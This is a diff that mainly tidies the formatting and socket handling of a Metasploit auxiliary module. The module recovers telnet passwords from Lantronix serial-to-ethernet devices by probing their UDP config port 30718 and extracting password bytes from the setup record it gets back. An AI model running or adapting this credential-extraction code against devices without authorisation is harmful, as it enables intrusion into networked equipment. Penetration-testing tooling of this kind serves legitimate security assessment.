@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Udp
@@ -12,23 +10,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Lantronix Telnet Password Recovery',
+      'Name' => 'Lantronix Telnet Password Recovery',
       'Description' => %q{
           This module retrieves the setup record from Lantronix serial-to-ethernet
         devices via the config port (30718/udp, enabled by default) and extracts the
         telnet password. It has been tested successfully on a Lantronix Device Server
         with software version V5.8.0.1.
       },
-      'Author'      => 'jgor',
-      'License'     => MSF_LICENSE
+      'Author' => 'jgor',
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         Opt::CHOST,
         Opt::RPORT(30718),
-        OptBool.new('CHECK_TCP', [false , 'Check TCP instead of UDP', false])
-      ], self.class)
+        OptBool.new('CHECK_TCP', [false, 'Check TCP instead of UDP', false])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -38,9 +37,9 @@ class MetasploitModule < Msf::Auxiliary
     begin
       sock_opts = {
         'LocalHost' => datastore['CHOST'] || nil,
-        'PeerHost'  => ip,
-        'PeerPort'  => datastore['RPORT'],
-        'Context'   =>  {
+        'PeerHost' => ip,
+        'PeerPort' => datastore['RPORT'],
+        'Context' => {
           'Msf' => framework,
           'MsfExploit' => self
         }
@@ -55,9 +54,9 @@ class MetasploitModule < Msf::Auxiliary
         rem_sock = Rex::Socket::Udp.create(sock_opts)
       end
       rem_sock.put(setup_probe)
-      res = rem_sock.recvfrom(65535, 0.5) and res[1]
+      res = rem_sock.timed_recvfrom(65535, 0.5)
 
-      password = parse_reply(res)
+      password = res && parse_reply(res)
     rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
       print_error("Connection error")
     rescue ::Interrupt
@@ -107,10 +106,9 @@ class MetasploitModule < Msf::Auxiliary
 
     # If response is a setup record, extract password bytes 13-16
     if setup_record[3] and setup_record[3].ord == 0xF9
-      return setup_record[12,4]
+      return setup_record[12, 4]
     else
       return nil
     end
   end
-
 end
